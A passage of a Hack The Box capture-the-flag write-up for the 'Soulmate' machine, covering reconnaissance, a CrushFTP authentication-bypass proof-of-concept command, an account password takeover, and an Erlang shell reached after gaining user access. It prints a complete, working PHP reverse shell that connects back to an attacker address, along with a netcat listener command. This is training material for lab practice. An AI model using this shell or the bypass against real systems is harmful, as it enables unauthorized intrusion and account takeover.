---
icon: linux
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
  tags:
    visible: true
---

# Soulmate Machine Walk-through

<figure><img src="../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

***

_Welcome! This write-up walks through the Soulmate machine on Hack The Box. My goal is simple: stay motivated, record what I learn, and explain each step so the techniques and concepts stick. Follow along, replicate the steps, and level up your skills._

#### **About Machine**

`Soulmate` is an easy difficulty Linux machine that showcases exploitation of [CVE-2025-31161](https://nvd.nist.gov/vuln/detail/CVE-2025-31161), an authentication bypass vulnerability in CrushFTP, allowing players to access an admin user account. By uploading a malicious PHP file to the application's web root, remote command execution is achieved. For privilege escalation, [CVE-2025-32433](https://nvd.nist.gov/vuln/detail/CVE-2025-32433), another remote command execution vulnerability in the Erlang/OTP SSH server is being exploited to gain `root` access.

#### Machine Info

* **Machine Name:** Soulmate
* **Machine Type:** Linux
* **Difficulty:** Easy
* Machine Link: \[[https://app.hackthebox.com/machines/Soulmate](https://app.hackthebox.com/machines/Soulmate)]

#### Initial Scanning:

```bash
nmap -p- -A -sC -vv --min-rate 10000 10.10.11.86 -oN scan.txt

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/13%OT=22%CT=1%CU=41163%PV=Y%DS=2%DC=T%G=Y%TM=68C58D4
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST1
OS:1NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 20.191 days (since Sun Aug 24 16:22:35 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   69.79 ms 10.10.14.1
2   69.93 ms 10.10.11.86

```

Add the domain `soulmate.htb` to `/etc/hosts` file:

```bash
sudo echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts
```

Now lets browse the 80 port:

<figure><img src="https://cdn-images-1.medium.com/max/800/1*3MdQYV5VXxOGoktndfZwvw.png" alt=""><figcaption></figcaption></figure>

#### Directory Listing

```bash
dirsearch -u http://soulmate.htb/ -e php,html,txt -t 100 --random-agent --include-status=200,301,302 --timeout=5

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, html, txt | HTTP method: GET | Threads: 100 | Wordlist size: 10403

Output File: /home/kali/pentest/htb/Soulmate/reports/http_soulmate.htb/__25-09-14_15-40-05.txt

Target: http://soulmate.htb/

[15:40:05] Starting: 
[15:40:17] 301 -  178B  - /assets  ->  http://soulmate.htb/assets/          
[15:40:21] 302 -    0B  - /dashboard.php  ->  /login                        
[15:40:28] 200 -    8KB - /login.php                                        
[15:40:28] 302 -    0B  - /logout.php  ->  login.php                        
[15:40:34] 302 -    0B  - /profile.php  ->  /login                          
[15:40:35] 200 -   11KB - /register.php                                     
                                                                             
Task Completed
```

We could not find any interesting directory. Now we will try to Fuzz subdomain.

#### Subdomain Fuzzing

```bash
ffuf -u 'http://soulmate.htb/' -H 'Host: FUZZ.soulmate.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 89ms]
:: Progress: [4989/4989] :: Job [1/1] :: 549 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```

Now add the `ftp.soulmate.htb` to hosts file.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*voSEjXeVC3B5G9CmnlnlFw.png" alt=""><figcaption></figcaption></figure>

Now browse the [`http://ftp.soulmate.htb`](http://ftp.soulmate.htb) and we see this:

<figure><img src="https://cdn-images-1.medium.com/max/800/1*XNDacLOIagLO_2IaxuBE8A.png" alt=""><figcaption></figcaption></figure>

> **What is CrushFTP?**

> CrushFTP is a **Java-based, cross-platform file transfer server** (FTP/FTPS/SFTP/WebDAV/HTTP(S)) with a full web-based administration and user interface. It’s designed for managed file transfers and file sharing — offering user/account management, virtual directories, SSL/TLS, AD/LDAP integration, fine-grained permissions, event-driven automation (triggers on uploads/downloads), logging/auditing, clustering/high-availability, and features like shareable links, quotas, and two-factor authentication. It’s commonly used by organizations that need a flexible, enterprise-capable file server with a modern web UI (commercial product with trial options).

After many research we found this:

[**CrushFTP CVE-2025-31161 Auth Bypass and Post-Exploitation | Huntress**\
&#xNAN;_&#x48;untress observed in-the-wild exploitation of CVE-2025-31161, an authentication bypass vulnerability in versions of…_&#x77;ww.huntress.com](https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation)[**GitHub - Immersive-Labs-Sec/CVE-2025-31161: Proof of Concept for CVE-2025-31161 / CVE-2025-2825**\
&#xNAN;_&#x50;roof of Concept for CVE-2025-31161 / CVE-2025-2825 - Immersive-Labs-Sec/CVE-2025-3116&#x31;_&#x67;ithub.com](https://github.com/Immersive-Labs-Sec/CVE-2025-31161)

Now try to bypass the authentication by using the PoC.

```bash
python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user emni --password emni123 
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*HORWgtz-zu46RQ2mll4Cvw.png" alt=""><figcaption></figcaption></figure>

It is working. Now try to login using new username and password.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*2Uysf06C3icOjn9hqK9cTg.png" alt=""><figcaption></figcaption></figure>

After many research we see there is a user management module in side the Admin Section.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*aC9UeHCw2cj8rGsCLLPgrA.png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://cdn-images-1.medium.com/max/800/1*1Y3u11za4EpnNU3HM6RfvA.png" alt=""><figcaption></figcaption></figure>

Open the User Manager Section and we found many user account.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*LAaW-lLhMAXYK8Lu5qDpjQ.png" alt=""><figcaption></figcaption></figure>

Try to change any other user password. And yes we can.\
We change the ben user password and after that we try to login user ben user.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*FQBEqonCxt7PaHtDXWQ8CA.png" alt=""><figcaption></figcaption></figure>

Now we have ben user account

<figure><img src="https://cdn-images-1.medium.com/max/800/1*kqz4N5ehAepBMwjuuyW_Xg.png" alt=""><figcaption></figcaption></figure>

After so many research we found a file upload section from webProd directory. And we upload php reverse shell:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '<IP ADDRESS>';
$port = <PORT>;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
 $pid = pcntl_fork();
 
 if ($pid == -1) {
  printit("ERROR: Can't fork");
  exit(1);
 }
 
 if ($pid) {
  exit(0);  // Parent exits
 }
 if (posix_setsid() == -1) {
  printit("Error: Can't setsid()");
  exit(1);
 }

 $daemon = 1;
} else {
 printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
 printit("$errstr ($errno)");
 exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
 printit("ERROR: Can't spawn shell");
 exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
 if (feof($sock)) {
  printit("ERROR: Shell connection terminated");
  break;
 }

 if (feof($pipes[1])) {
  printit("ERROR: Shell process terminated");
  break;
 }

 $read_a = array($sock, $pipes[1], $pipes[2]);
 $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

 if (in_array($sock, $read_a)) {
  if ($debug) printit("SOCK READ");
  $input = fread($sock, $chunk_size);
  if ($debug) printit("SOCK: $input");
  fwrite($pipes[0], $input);
 }

 if (in_array($pipes[1], $read_a)) {
  if ($debug) printit("STDOUT READ");
  $input = fread($pipes[1], $chunk_size);
  if ($debug) printit("STDOUT: $input");
  fwrite($sock, $input);
 }

 if (in_array($pipes[2], $read_a)) {
  if ($debug) printit("STDERR READ");
  $input = fread($pipes[2], $chunk_size);
  if ($debug) printit("STDERR: $input");
  fwrite($sock, $input);
 }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
 if (!$daemon) {
  print "$string\n";
 }
}

?>
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*ML6Cgg32rrFFbGlcvBqNpA.png" alt=""><figcaption></figcaption></figure>

To execute the file we use [hackbar2](https://addons.mozilla.org/en-US/firefox/addon/hackbar-free/) firefox extention. To do this:

1. Inspect the page.
2. go to application -> HackBar
3. Click on load URL and edit the URL to `http://soulmate.htb/<filename.php>`
4. Click Execute.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*4k5hBzRdJtZsva_Wv1qADA.png" alt=""><figcaption></figcaption></figure>

> Note: Before execute the file first run the `netcat` listener first:

```bash
rlwrap -cAr nc -lnvp <PORT>
```

And we get reverse shell connection:

<figure><img src="https://cdn-images-1.medium.com/max/800/1*cnLFrazjxd-AlTUYkgoc8Q.png" alt=""><figcaption></figcaption></figure>

So, we have shell of `www-data` Now we check `/etc/passwd` file for others normal user account. and we see there is a user called `ben`.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*DtK3jEdquE3YMBEEmqjkVA.png" alt=""><figcaption></figcaption></figure>

After many analysis we found a useful credential from `/var/www/html/soulmate.htb/config/config.php`

<figure><img src="https://cdn-images-1.medium.com/max/800/1*e0izVhjxodqBOVNQ7TJhyQ.png" alt=""><figcaption></figcaption></figure>

But this is not a correct password. we need to more enumerate the machine.

We check the running processes and we found this:

```bash
ps -aux 
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*q48qPXkBmfck0Ilsbr1hSg.png" alt=""><figcaption></figcaption></figure>

It means the root previously ran a login script. View the specific content found the password of the ben user.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*nzn5BS-XRxEVswDlJgYjYA.png" alt=""><figcaption></figcaption></figure>

We successfully get ssh connection by using ben user credential.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*Mxgzz7Jb3zpEk1D65mMGHg.png" alt=""><figcaption></figcaption></figure>

We successfully get user flag.&#x20;

<figure><img src="https://cdn-images-1.medium.com/max/800/1*93zwcJm7iTs0Wg9itbCkhg.png" alt=""><figcaption></figcaption></figure>

Now for PrivEsc we Enumerate the system using [LinPEAS](https://github.com/peass-ng/PEASS-ng), and we notice that there port 2222 is active.&#x20;

<figure><img src="https://cdn-images-1.medium.com/max/800/1*17wH5AEF2ljoyHzD5RXn1A.png" alt=""><figcaption></figcaption></figure>

Try to connect with the port 2222:

```bash
ssh -p 2222 ben@127.0.0.1
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*7JeFL6L6BjCRYRWPda4YMQ.png" alt=""><figcaption></figcaption></figure>

That’s the **Erlang interactive shell (Eshell)** — the Erlang VM’s REPL, not a Unix/Bash shell; it accepts Erlang expressions (e.g. `help().`, `io:format("hi~n").`).

```bash
(ssh_runner@soulmate)1> help().
** shell internal commands **
b()        -- display all variable bindings
e(N)       -- repeat the expression in query <N>
f()        -- forget all variable bindings
f(X)       -- forget the binding of variable X
h()        -- history
h(Mod)     -- help about module
h(Mod,Func)-- help about function in module
h(Mod,Func,Arity) -- help about function with arity in module
ht(Mod)    -- help about a module's types
ht(Mod,Type) -- help about type in module
ht(Mod,Type,Arity) -- help about type with arity in module
hcb(Mod)    -- help about a module's callbacks
hcb(Mod,CB) -- help about callback in module
hcb(Mod,CB,Arity) -- help about callback with arity in module
history(N) -- set how many previous commands to keep
results(N) -- set how many previous command results to keep
catch_exception(B) -- how exceptions are handled
v(N)       -- use the value of query <N>
rd(R,D)    -- define a record
rf()       -- remove all record information
rf(R)      -- remove record information about R
rl()       -- display all record information
rl(R)      -- display record information about R
rp(Term)   -- display Term using the shell's record information
rr(File)   -- read record information from File (wildcards allowed)
rr(F,R)    -- read selected record information from file(s)
rr(F,R,O)  -- read selected record information with options
lf()       -- list locally defined functions
lt()       -- list locally defined types
lr()       -- list locally defined records
ff()       -- forget all locally defined functions
ff({F,A})  -- forget locally defined function named as atom F and arity A
tf()       -- forget all locally defined types
tf(T)      -- forget locally defined type named as atom T
fl()       -- forget all locally defined functions, types and records
save_module(FilePath) -- save all locally defined functions, types and records to a file
bt(Pid)    -- stack backtrace for a process
c(Mod)     -- compile and load module or file <Mod>
cd(Dir)    -- change working directory
flush()    -- flush any messages sent to the shell
help()     -- help info
h(M)       -- module documentation
h(M,F)     -- module function documentation
h(M,F,A)   -- module function arity documentation
i()        -- information about the system
ni()       -- information about the networked system
i(X,Y,Z)   -- information about pid <X,Y,Z>
l(Module)  -- load or reload module
lm()       -- load all modified modules
lc([File]) -- compile a list of Erlang modules
ls()       -- list files in the current directory
ls(Dir)    -- list files in directory <Dir>
m()        -- which modules are loaded
m(Mod)     -- information about module <Mod>
mm()       -- list all modified modules
memory()   -- memory allocation information
memory(T)  -- memory allocation information of type <T>
nc(File)   -- compile and load code in <File> on all nodes
nl(Module) -- load module on all nodes
pid(X,Y,Z) -- convert X,Y,Z to a Pid
pwd()      -- print working directory
q()        -- quit - shorthand for init:stop()
regs()     -- information about registered processes
nregs()    -- information about all registered processes
uptime()   -- print node uptime
xm(M)      -- cross reference check a module
y(File)    -- generate a Yecc parser
** commands in module i (interpreter interface) **
ih()       -- print help for the i module
true
(ssh_runner@soulmate)2> 
```

Now run `m().` command to View loaded modules and discover old acquaintances os

```bash
                        m().
Module                File
application           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application.beam
application_controll  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application_controller.beam
application_master    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application_master.beam
atomics               preloaded
auth                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/auth.beam
base64                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/base64.beam
beam_a                /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_a.beam
beam_asm              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_asm.beam
beam_block            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_block.beam
beam_call_types       /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_call_types.beam
beam_clean            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_clean.beam
beam_core_to_ssa      /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_core_to_ssa.beam
beam_dict             /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_dict.beam
beam_digraph          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_digraph.beam
beam_doc              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_doc.beam
beam_flatten          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_flatten.beam
beam_jump             /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_jump.beam
beam_lib              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/beam_lib.beam
beam_opcodes          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_opcodes.beam
beam_ssa              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa.beam
beam_ssa_alias        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_alias.beam
beam_ssa_bc_size      /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_bc_size.beam
beam_ssa_bool         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_bool.beam
beam_ssa_bsm          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_bsm.beam
beam_ssa_codegen      /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_codegen.beam
beam_ssa_dead         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_dead.beam
beam_ssa_destructive  /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_destructive_update.beam
beam_ssa_opt          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_opt.beam
beam_ssa_pre_codegen  /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_pre_codegen.beam
beam_ssa_recv         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_recv.beam
beam_ssa_share        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_share.beam
beam_ssa_ss           /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_ss.beam
beam_ssa_throw        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_throw.beam
beam_ssa_type         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_type.beam
beam_trim             /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_trim.beam
beam_types            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_types.beam
beam_utils            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_utils.beam
beam_validator        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_validator.beam
beam_z                /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_z.beam
binary                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/binary.beam
c                     /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/c.beam
cerl                  /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/cerl.beam
cerl_clauses          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/cerl_clauses.beam
cerl_trees            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/cerl_trees.beam
code                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/code.beam
code_server           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/code_server.beam
compile               /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/compile.beam
core_lib              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/core_lib.beam
counters              preloaded
crypto                /usr/local/lib/erlang/lib/crypto-5.5.3/ebin/crypto.beam
digraph               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/digraph.beam
digraph_utils         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/digraph_utils.beam
edlin                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/edlin.beam
edlin_key             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/edlin_key.beam
epp                   /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/epp.beam
erl_abstract_code     /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_abstract_code.beam
erl_anno              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_anno.beam
erl_bifs              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/erl_bifs.beam
erl_distribution      /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erl_distribution.beam
erl_epmd              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erl_epmd.beam
erl_eval              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_eval.beam
erl_expand_records    /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_expand_records.beam
erl_features          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_features.beam
erl_init              preloaded
erl_internal          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_internal.beam
erl_lint              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_lint.beam
erl_parse             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_parse.beam
erl_prim_loader       preloaded
erl_scan              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_scan.beam
erl_signal_handler    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erl_signal_handler.beam
erl_tracer            preloaded
erlang                preloaded
erpc                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erpc.beam
error_handler         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/error_handler.beam
error_logger          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/error_logger.beam
erts_code_purger      preloaded
erts_dirty_process_s  preloaded
erts_internal         preloaded
erts_literal_area_co  preloaded
erts_trace_cleaner    preloaded
escript               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/escript.beam
ets                   /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/ets.beam
file                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/file.beam
file_io_server        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/file_io_server.beam
file_server           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/file_server.beam
filename              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/filename.beam
gb_sets               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gb_sets.beam
gb_trees              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gb_trees.beam
gen                   /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen.beam
gen_event             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen_event.beam
gen_server            /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen_server.beam
gen_statem            /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen_statem.beam
gen_tcp               /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/gen_tcp.beam
global                /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/global.beam
global_group          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/global_group.beam
group                 /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/group.beam
group_history         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/group_history.beam
heart                 /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/heart.beam
inet                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet.beam
inet_config           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_config.beam
inet_db               /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_db.beam
inet_gethost_native   /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_gethost_native.beam
inet_parse            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_parse.beam
inet_tcp              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_tcp.beam
inet_tcp_dist         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_tcp_dist.beam
inet_udp              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_udp.beam
init                  preloaded
io                    /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io.beam
io_lib                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io_lib.beam
io_lib_format         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io_lib_format.beam
io_lib_pretty         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io_lib_pretty.beam
kernel                /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/kernel.beam
kernel_config         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/kernel_config.beam
kernel_refc           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/kernel_refc.beam
lists                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/lists.beam
logger                /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger.beam
logger_backend        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_backend.beam
logger_config         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_config.beam
logger_filters        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_filters.beam
logger_formatter      /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_formatter.beam
logger_h_common       /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_h_common.beam
logger_handler_watch  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_handler_watcher.beam
logger_olp            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_olp.beam
logger_proxy          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_proxy.beam
logger_server         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_server.beam
logger_simple_h       /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_simple_h.beam
logger_std_h          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_std_h.beam
logger_sup            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_sup.beam
maps                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/maps.beam
net_kernel            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/net_kernel.beam
orddict               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/orddict.beam
ordsets               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/ordsets.beam
os                    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/os.beam
otp_internal          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/otp_internal.beam
peer                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/peer.beam
persistent_term       preloaded
prim_buffer           preloaded
prim_eval             preloaded
prim_file             preloaded
prim_inet             preloaded
prim_net              preloaded
prim_socket           preloaded
prim_tty              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/prim_tty.beam
prim_zip              preloaded
proc_lib              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/proc_lib.beam
proplists             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/proplists.beam
pubkey_cert_records   /usr/local/lib/erlang/lib/public_key-1.17.1/ebin/pubkey_cert_records.beam
public_key            /usr/local/lib/erlang/lib/public_key-1.17.1/ebin/public_key.beam
queue                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/queue.beam
rand                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/rand.beam
